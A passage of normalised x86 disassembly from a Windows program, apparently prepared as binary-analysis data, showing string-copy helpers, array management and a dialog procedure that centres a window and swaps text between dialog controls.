mov [ ecx + 0x14 ] ebx
push edi
mov [ esp + 0x24 ] ebx
mov [ ecx + 0x4 ] bl
call sub_401dd0
mov ecx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_402140
push 0xffffffff
push sub_4be768
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push ebx
push esi
xor ebx ebx
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
call sub_401dd0
mov edx [ esp + 0x40 ]
mov eax edx
mov [ esp + 0x30 ] ebx
lea esi [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x14 ]
call sub_401cc0
mov esi [ esp + 0x38 ]
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov ecx [ esp + 0x28 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_4021f0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_401dd0
add esi 0x1c
cmp esi ebx
jne r-xdata
pop edi
sub_402220
push esi
push edi
mov edi [ esp + 0xc ]
push 0xffffffff
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push edi
mov [ esi + 0x4 ] 0x0
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ edi + 0x20 ]
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0x24 ]
mov [ esi + 0x24 ] edx
mov edi [ edi + 0x28 ]
test edi edi
je r-xdata
mov [ esi + 0x28 ] edi
pop edi
mov eax esi
pop esi
retn 0x4
inc [ edi + 0x4 ]
sub_402270
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
push ebx
xor ebx ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi + 0x18 ] 0x10
jb r-xdata
pop ebx
sub_4022b0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
pop esi
mov [ eax ] ecx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
push 0xffffffff
push 0x0
sub esi 0x1c
sub edi 0x1c
push esi
mov ecx edi
call sub_401dd0
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub_4022f0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
pop esi
mov [ eax ] ecx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
push 0xffffffff
push 0x0
sub esi 0x38
sub edi 0x38
push esi
mov ecx edi
call sub_401dd0
push 0xffffffff
push 0x0
lea eax [ esi + 0x1c ]
push eax
lea ecx [ edi + 0x1c ]
call sub_401dd0
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub_402340
push 0xffffffff
push sub_4be7d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_4b605e
xor eax eax
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
push 0xffffffff
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] 0xf
push eax
mov [ esp + 0x18 ] eax
mov [ ecx + 0x4 ] al
mov eax [ esp + 0x20 ]
push eax
call sub_401dd0
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4023c0
push esi
mov esi ecx
push esi
call [ DeleteCriticalSection@IAT ]
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x24 ] 0x0
pop esi
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_402400
push 0xffffffff
push sub_4be788
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
mov esi ecx
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov [ esp + 0x18 ] esi
mov [ esi + 0x4 ] bl
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ edi + 0x20 ]
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0x24 ]
mov [ esi + 0x24 ] edx
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov ecx [ edi + 0x2c ]
mov [ esi + 0x2c ] ecx
mov edx [ edi + 0x30 ]
mov [ esi + 0x30 ] edx
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
mov ecx [ edi + 0x38 ]
mov [ esi + 0x38 ] ecx
mov edx [ edi + 0x3c ]
mov [ esi + 0x3c ] edx
mov eax [ edi + 0x40 ]
mov [ esi + 0x40 ] eax
mov ecx [ edi + 0x44 ]
mov [ esi + 0x44 ] ecx
mov edx [ edi + 0x48 ]
mov [ esi + 0x48 ] edx
mov eax [ edi + 0x4c ]
mov [ esi + 0x4c ] eax
mov ecx [ edi + 0x50 ]
mov [ esi + 0x50 ] ecx
push 0xffffffff
lea ecx [ esi + 0x54 ]
push ebx
add edi 0x54
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edi
mov [ esp + 0x24 ] ebx
mov [ ecx + 0x4 ] bl
call sub_401dd0
mov ecx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4024d0
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_401e80
pop edi
mov eax esi
pop esi
retn 0x4
sub_402510
push esi
mov esi [ esp + 0x8 ]
mov eax esi
push edi
lea edi [ eax + 0x1 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push esi
call sub_401e80
pop edi
pop esi
retn 0x4
sub_402540
push esi
push edi
mov edi [ esp + 0xc ]
push 0xffffffff
push 0x0
push edi
mov esi ecx
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ edi + 0x20 ]
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0x24 ]
mov [ esi + 0x24 ] edx
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov ecx [ edi + 0x2c ]
mov [ esi + 0x2c ] ecx
mov edx [ edi + 0x30 ]
mov [ esi + 0x30 ] edx
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
mov ecx [ edi + 0x38 ]
mov [ esi + 0x38 ] ecx
mov edx [ edi + 0x3c ]
mov [ esi + 0x3c ] edx
mov eax [ edi + 0x40 ]
mov [ esi + 0x40 ] eax
mov ecx [ edi + 0x44 ]
mov [ esi + 0x44 ] ecx
mov edx [ edi + 0x48 ]
mov [ esi + 0x48 ] edx
mov eax [ edi + 0x4c ]
push 0xffffffff
mov [ esi + 0x4c ] eax
mov ecx [ edi + 0x50 ]
push 0x0
mov [ esi + 0x50 ] ecx
add edi 0x54
push edi
lea ecx [ esi + 0x54 ]
call sub_401dd0
pop edi
mov eax esi
pop esi
retn 0x4
sub_4025c0
mov eax [ esp + 0x8 ]
sub esp 0x120
sub eax 0x110
push ebx
push ebp
push esi
push edi
je r-xdata
mov ebx [ esp + 0x140 ]
mov esi [ esp + 0x134 ]
push ebx
push 0xffffffeb
push esi
call [ SetWindowLongA@IAT ]
lea eax [ esp + 0x10 ]
push eax
push esi
call [ GetParent@IAT ]
mov edi [ GetWindowRect@IAT ]
push eax
call edi
lea ecx [ esp + 0x20 ]
push ecx
push esi
call edi
mov ebp [ esp + 0x2c ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
mov edi [ esp + 0x28 ]
sub eax ebp
mov ebp [ esp + 0x18 ]
sub eax ecx
add eax edx
cdq
sub eax edx
sar eax 0x1
push 0x5
add eax ecx
mov ecx [ esp + 0x14 ]
push 0x0
push 0x0
push eax
mov eax [ esp + 0x30 ]
sub eax edi
sub eax ecx
add eax ebp
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push esi
call [ SetWindowPos@IAT ]
mov al [ rw-data ]
test al al
mov ebp [ GetDlgItem@IAT ]
push 0x0
je r-xdata
dec eax
jne r-xdata
push 0x411
push esi
mov edi 0x410
call ebp
push eax
call [ ShowWindow@IAT ]
push 0x0
push 0x410
push esi
mov edi 0x411
call ebp
push eax
call [ ShowWindow@IAT ]
push 0x1
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x120
retn 0x10
movzx eax [ esp + 0x13c ]
dec eax
je r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
push 0x4f3
push esi
call [ CheckDlgButton@IAT ]
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
mov esi [ esp + 0x134 ]
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
push 0x4f3
push esi
mov edi eax
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
dec eax
je r-xdata
push r--data
push r--data
jmp r-xdata
push eax
push edi
push esi
call [ SetDlgItemTextA@IAT ]
push 0xffffffff
push 0x0
push 0xb1
push edi
push esi
call [ SendDlgItemMessageA@IAT ]
push edi
push esi
call ebp
push eax
call [ SetFocus@IAT ]
mov eax [ ebx + 0x14 ]
test eax eax
jne r-xdata
mov eax 0x410
mov [ rw-data ] 0x0
mov eax 0x411
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ esp + 0x134 ]
push 0x2
push edx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x120
retn 0x10
sub eax 0x4f1
jne r-xdata
push esi
call [ SetWindowTextA@IAT ]
push 0x100
lea ecx [ esp + 0x34 ]
push ecx
push eax
push esi
call [ GetDlgItemTextA@IAT ]
lea edx [ esp + 0x30 ]
push edx
mov ecx edi
call sub_402510
push 0x1
push esi
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x120
retn 0x10
mov esi [ esp + 0x134 ]
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
push 0x4f3
push esi
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
mov edi 0x410
mov ebx 0x411
mov edi 0x411
mov ebx 0x410
jmp r-xdata
push 0x100
lea eax [ esp + 0x34 ]
push eax
push ebx
push esi
call [ GetDlgItemTextA@IAT ]
lea ecx [ esp + 0x30 ]
push ecx
push edi
push esi
call [ SetDlgItemTextA@IAT ]
push 0x5
push edi
mov edi [ GetDlgItem@IAT ]
push esi
call edi
mov ebp [ ShowWindow@IAT ]
push eax
call ebp
push 0x0
push ebx
push esi
call edi
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x120
retn 0x10
sub_402850
push ebp
mov ebp esp
push 0xffffffff
push sub_4be7c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x74
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x18 ] 0x10
push esi
push edi
mov [ ebp - 0x10 ] esp
lea edi [ ebx + 0x4 ]
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov ecx 0xf
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x44 ] 0x0
cmp [ ebx + 0x18 ] 0x10
mov [ ebp - 0x4 ] 0x1
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_457f40
mov esi eax
xor eax eax
add esp 0x4
cmp esi eax
jne r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push eax
lea ecx [ ebp - 0x64 ]
call sub_401e80
cmp [ ebx + 0x18 ] 0x10
mov eax [ ebx + 0x14 ]
jb r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
sub eax 0x3
mov edi 0x10
je r-xdata
sub eax esi
add ecx esi
push eax
push ecx
lea ecx [ ebp - 0x48 ]
call sub_401e80
mov eax [ ebx + 0x40 ]
xor esi esi
sub eax esi
mov [ ebp - 0x4 ] 0x2
je r-xdata
push 0x1
push esi
push esi
push esi
push esi
push edi
call sub_41c070
mov esi eax
add esp 0x18
test esi esi
je r-xdata
mov edi [ edi ]
cmp [ ebp - 0x4c ] edi
mov eax [ ebp - 0x60 ]
jae r-xdata
dec eax
mov eax [ ebp - 0x30 ]
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
inc [ esi + 0x4 ]
push 0x1
push esi
push esi
push esi
push esi
push eax
call sub_41c070
mov esi eax
xor ecx ecx
add esp 0x18
cmp esi ecx
je r-xdata
lea eax [ ebp - 0x60 ]
cmp eax edi
jb r-xdata
cmp eax edi
jb r-xdata
mov [ edi ] esi
xor edi edi
jmp r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov [ ebp + 0x8 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x24 ] eax
cmp [ rw-data ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] ecx
je r-xdata
inc [ esi + 0x4 ]
cmp [ ebp - 0x4c ] edi
mov [ ebp - 0x30 ] 0xf
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x44 ] 0x0
jb r-xdata
mov ecx [ ebp - 0x44 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebp - 0x4c ] edi
mov [ ebp - 0x30 ] 0xf
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x44 ] 0x0
jb r-xdata
mov edx [ ebp - 0x44 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp - 0x30 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ rw-data ] ecx
je r-xdata
mov [ ebp - 0x28 ] edi
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x60 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x60 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebp - 0x4c ] esi
mov [ ebp - 0x30 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x44 ] 0x0
jb r-xdata
mov edx [ ebp - 0x44 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
xor edi edi
mov [ ebp - 0x68 ] 0xf
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x7c ] 0x0
test [ ebx + 0x1c ] 0x20000000
mov [ ebp - 0x4 ] 0x4
je r-xdata
or [ ebp - 0x28 ] 0x20
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x60 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x2c ] edx
mov eax [ rw-data ]
cmp eax ecx
je r-xdata
mov [ eax ] esi
call [ rw-data ]
mov edi eax
cmp [ ebp - 0x68 ] 0x10
jb r-xdata
inc [ esi + 0x4 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ eax + 0x8c ]
cmp eax ecx
je r-xdata
test esi esi
mov [ ebp - 0x68 ] 0xf
mov [ ebp - 0x6c ] 0x0
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov ecx [ ebp - 0x7c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
test edi edi
je r-xdata
cmp [ eax + 0x34 ] 0x10
jb r-xdata
cmp [ eax + 0x34 ] 0x10
jb r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x68 ]
xor ecx ecx
cmp eax 0x10
jb r-xdata
cmp [ edi + 0x37c ] 0x10
jb r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
lea eax [ edi + 0x368 ]
mov eax [ edi + 0x368 ]
jmp r-xdata
mov edi [ rw-data ]
push eax
lea edx [ ebp - 0x64 ]
push edx
call sub_401380
add esp 0x8
test al al
je r-xdata
mov ecx [ rw-data ]
mov edi [ ecx + 0x8c ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
cmp esi ecx
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x44 ]
push edx
push eax
push ecx
mov [ ebp - 0x14 ] esp
mov eax esp
je r-xdata
push eax
lea ecx [ ebp - 0x80 ]
call sub_402510
sub_402bc0
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esi + 0xc ]
lea eax [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x8 ]
cmp ecx eax
ja r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ edx + eax * 4 ]
call sub_4016b0
dec [ esi + 0x10 ]
jne r-xdata
sub eax ecx
mov [ esi + 0xc ] 0x0
sub_402c00
push 0xffffffff
push sub_4be7d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call sub_4b60ac
xor eax eax
push 0xffffffff
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
push eax
add edi 0xc
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] eax
push edi
mov [ esp + 0x20 ] eax
mov [ ecx + 0x4 ] al
call sub_401dd0
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_402c70
push 0xffffffff
push sub_4be7f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_402cf0
push 0xffffffff
push sub_4be7f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_402d70
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_4022b0
add esp 0x14
mov eax esi
pop esi
retn
sub_402db0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ esp + 0x18 ]
push ebx
mov ecx esi
call sub_402540
add esi 0x70
cmp esi edi
jne r-xdata
pop ebx
sub_402de0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_4022f0
add esp 0x14
mov eax esi
pop esi
retn
sub_402e20
push 0xffffffff
push sub_4be821
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx [ esp + 0x14 ]
mov [ esp ] ecx
test ecx ecx
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esp + 0x18 ]
push eax
call sub_402220
sub_402e70
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
pop esi
mov [ eax ] ecx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
sub esi 0x70
sub edi 0x70
push esi
mov ecx edi
call sub_402540
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub_402eb0
push ebp
mov ebp esp
push 0xffffffff
push sub_4be841
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x1c
jmp r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp edi [ ebp + 0xc ]
je r-xdata
sub_402f16
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
push esi
mov ecx ebx
call sub_401f90
add esi 0x1c
cmp esi edi
jne r-xdata
sub_402f50
push ebp
mov ebp esp
push 0xffffffff
push sub_4be861
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x38
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x38
jmp r-xdata
push edi
mov ecx esi
call sub_4020c0
cmp edi [ ebp + 0xc ]
je r-xdata
sub_402faa
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x10 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x34 ]
lea esp [ esp ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x1c ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp + 0x10 ]
mov [ esi - 0x1c ] 0xf
mov [ esi - 0x20 ] ebx
mov [ esi - 0x30 ] bl
add edi 0x38
add esi 0x38
cmp edi eax
jne r-xdata
mov eax [ esi - 0x30 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_403030
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi ecx
mov [ esi ] eax
push edi
lea edi [ esi + 0x4 ]
xor ebx ebx
mov eax edx
mov ebp 0xf
lea ecx [ eax + 0x1 ]
mov [ edi + 0x18 ] ebp
mov [ edi + 0x14 ] ebx
mov [ edi + 0x4 ] bl
mov [ esp + 0x18 ] ecx
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax [ esp + 0x18 ]
push eax
push edx
mov ecx edi
call sub_401e80
mov edx [ esp + 0x1c ]
mov [ esi + 0x20 ] edx
mov [ esi + 0x44 ] ebp
mov [ esi + 0x40 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x6c ] ebp
mov [ esi + 0x68 ] ebx
mov [ esi + 0x58 ] bl
mov [ esi + 0x88 ] ebp
mov [ esi + 0x84 ] ebx
mov [ esi + 0x74 ] bl
pop edi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x94 ] bl
mov [ esi + 0x50 ] bl
mov [ esi + 0x51 ] bl
mov [ esi + 0x28 ] bl
mov [ esi + 0x98 ] ebx
mov [ esi + 0x9c ] ebx
mov [ esi + 0x8c ] ebx
mov [ esi + 0x29 ] bl
mov [ esi + 0xa0 ] ebx
mov [ esi + 0xa4 ] ebx
mov [ esi + 0xa8 ] bl
mov [ esi + 0xac ] ebx
mov [ esi + 0xb0 ] ebx
mov [ esi + 0x90 ] 0x6
mov [ esi + 0x48 ] 0xffffffff
mov [ esi + 0x4c ] 0x10
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
sub_403140
push esi
xor eax eax
push edi
mov edi [ esp + 0xc ]
cmp edi eax
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x9249249
jbe r-xdata
pop edi
xor al al
pop esi
retn 0x4
imul edi edi 0x1c
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_402c70
sub_4031a0
push esi
xor eax eax
push edi
mov edi [ esp + 0xc ]
cmp edi eax
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x2492492
jbe r-xdata
pop edi
xor al al
pop esi
retn 0x4
imul edi edi 0x70
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
